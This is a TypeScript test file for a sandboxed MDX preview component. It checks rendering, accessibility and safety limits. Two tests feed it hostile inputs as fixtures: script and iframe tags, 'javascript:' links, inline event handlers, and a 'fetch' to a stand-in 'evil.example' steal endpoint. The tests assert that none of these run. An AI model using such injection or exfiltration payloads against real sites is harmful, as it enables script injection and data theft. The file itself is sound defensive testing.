// @vitest-environment jsdom
import { fireEvent, render, screen, cleanup } from '@testing-library/react'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { MdxPreview } from './mdx-preview'
import { MAX_MDX_PREVIEW_CHARS, prepareMdxDocument, safeMdxLink } from './mdx-document'

vi.mock('react-i18next', () => ({ useTranslation: () => ({ t: (key: string) => key }) }))
afterEach(cleanup)

const sample = `# Guide

<Callout type="warning" title="Safety">

Read this first.

</Callout>

<Accordion title="Details">

Hidden content

</Accordion>

<Tabs>
<TabItem label="First">

First content

</TabItem>
<Tab label="Second">

Second content

</Tab>
</Tabs>

<Steps>
<Step title="Upload">

Choose files

</Step>
</Steps>

<CardGroup>
<Card title="Resources" href="https://example.com" description="Useful docs" />
</CardGroup>

<Figure caption="Flow diagram">
<Image src="images/flow.png" alt="Flow" />
</Figure>

| A | B |
| - | - |
| 1 | 2 |
`

describe('controlled MDX preview', () => {
  it('renders the documented components, local images and accessible interactions', () => {
    const resolver = vi.fn((src: string) => src === 'images/flow.png' ? '/api/web/knowledge/documents/1/images/2/content?version=3' : undefined)
    const { container } = render(<MdxPreview content={sample} resolveImageUrl={resolver} />)
    expect(prepareMdxDocument(sample).unsupported).toBe(0)
    expect(screen.getByRole('heading', { name: 'Guide' })).toBeTruthy()
    expect(container.querySelector('aside')?.textContent).toContain('Safety')
    expect(container.querySelector('details')).toBeTruthy()
    expect(container.querySelector('table')).toBeTruthy()
    expect(container.querySelector('ol li')?.textContent).toContain('Upload')
    expect(screen.getByRole('img').getAttribute('src')).toContain('version=3')
    expect(container.querySelector('figcaption')?.textContent).toBe('Flow diagram')
    expect(container.textContent?.match(/First content/g)).toHaveLength(1)
    expect(container.textContent?.match(/Second content/g)).toHaveLength(1)
    const first = screen.getByRole('tab', { name: 'First' })
    expect(first.getAttribute('aria-selected')).toBe('true')
    fireEvent.keyDown(first, { key: 'ArrowRight' })
    expect(screen.getByRole('tab', { name: 'Second' }).getAttribute('aria-selected')).toBe('true')
    expect(screen.getByRole('tabpanel').textContent).toContain('Second content')
    fireEvent.click(screen.getByText('knowledge.mdx.source'))
    expect(container.querySelector('pre')?.textContent).toBe(sample)
    expect(container.querySelector('img')).toBeNull()
  })

  it('never executes imports, expressions, event handlers, spread props or HTML', () => {
    const content = `import Exploit from 'https://evil.example/module.js'

export const value = fetch('https://evil.example/steal')

{globalThis.__mdxExecuted = true}

<Callout onClick="alert(1)">bad handler</Callout>

<Image src={'https://evil.example/a.png'} />

<Card {...props} />

<script>alert(1)</script>

<iframe src="https://evil.example" />

<Unknown>custom</Unknown>`
    const fetchSpy = vi.spyOn(globalThis, 'fetch')
    const resolver = vi.fn(() => undefined)
    const { container } = render(<MdxPreview content={content} resolveImageUrl={resolver} />)
    expect(prepareMdxDocument(content).unsupported).toBe(9)
    expect(container.querySelector('script,iframe,img,[onclick]')).toBeNull()
    expect(container.textContent).toContain('globalThis.__mdxExecuted')
    expect(Object.hasOwn(globalThis, '__mdxExecuted')).toBe(false)
    expect(fetchSpy).not.toHaveBeenCalled()
    expect(resolver).not.toHaveBeenCalled()
    fetchSpy.mockRestore()
  })

  it('does not load unbound images or enable unsafe links', () => {
    const content = `![external](https://evil.example/track.png)

<Image src="missing.svg" />

[bad](javascript:alert%281%29)

<Card title="bad" href="javascript:alert(1)" />`
    const { container } = render(<MdxPreview content={content} resolveImageUrl={() => undefined} />)
    expect(container.querySelector('img,a')).toBeNull()
    for (const url of ['javascript:alert(1)', 'data:text/html,bad', '//evil.example', '/api/web/logout', 'https://user:pass@example.com', 'java\nscript:bad']) expect(safeMdxLink(url)).toBeUndefined()
    expect(safeMdxLink('https://example.com/docs')).toBe('https://example.com/docs')
  })

  it('falls back to inert source on invalid or excessive documents', () => {
    expect(prepareMdxDocument('<Card title={').error).toBe('syntax')
    expect(prepareMdxDocument('x'.repeat(MAX_MDX_PREVIEW_CHARS + 1)).error).toBe('size')
    expect(prepareMdxDocument('<Steps>\n'.repeat(42) + '\n</Steps>'.repeat(42)).error).toBe('complexity')
    expect(prepareMdxDocument('x\n\n'.repeat(3000)).error).toBe('complexity')
    const { container } = render(<MdxPreview content={'<Card title={'} resolveImageUrl={() => undefined} />)
    expect(container.querySelector('pre')?.textContent).toBe('<Card title={')
  })
})
